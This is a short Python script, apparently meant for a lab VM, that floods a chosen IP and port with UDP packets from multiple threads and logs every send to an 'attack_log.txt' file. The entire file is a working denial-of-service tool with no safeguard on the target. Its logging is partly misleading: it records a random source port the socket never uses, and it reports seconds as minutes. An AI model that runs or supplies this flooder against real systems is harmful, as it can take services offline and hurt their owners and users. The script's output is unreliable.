import socket
import threading
import random
import time
import sys

target_ip = input("Enter VM machine's IP: ")
target_port = int(input("Enter destination port (e.g. 80): "))
num_packets = int(input("Enter number of packets (e.g. 65000): "))
num_threads = int(input("Enter number of threads (e.g. 10): "))

message = b"X" * 1024
log_file = "attack_log.txt"
lock = threading.Lock()

sent_count = 0

def flood(thread_id, packets_per_thread):
    global sent_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    for i in range(1, packets_per_thread + 1):
        try:
            source_port = random.randint(1024, 65535)
            sock.sendto(message, (target_ip, target_port))

            with lock:
                sent_count += 1
                percent = (sent_count / num_packets) * 100
                log_line = f"[Thread {thread_id}] Sent {sent_count}/{num_packets} ({percent:.2f}%) to {target_ip}:{target_port} from port {source_port}\n"
                print(log_line.strip())
                with open(log_file, "a") as f:
                    f.write(log_line)

        except Exception as e:
            with lock:
                print(f"[Thread {thread_id}] Error: {e}")

if __name__ == "__main__":
    print(f"\nStarting flood of {num_packets} packets to {target_ip}:{target_port} using {num_threads} threads...\n")
    start_time = time.time()

    packets_per_thread = num_packets // num_threads
    threads = []

    for i in range(num_threads):
        t = threading.Thread(target=flood, args=(i+1, packets_per_thread))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    elapsed = time.time() - start_time
    print(f"\n✅ Finished sending {num_packets} packets in {elapsed:.2f} minutes.")
    print(f"📄 Log saved to: {log_file}")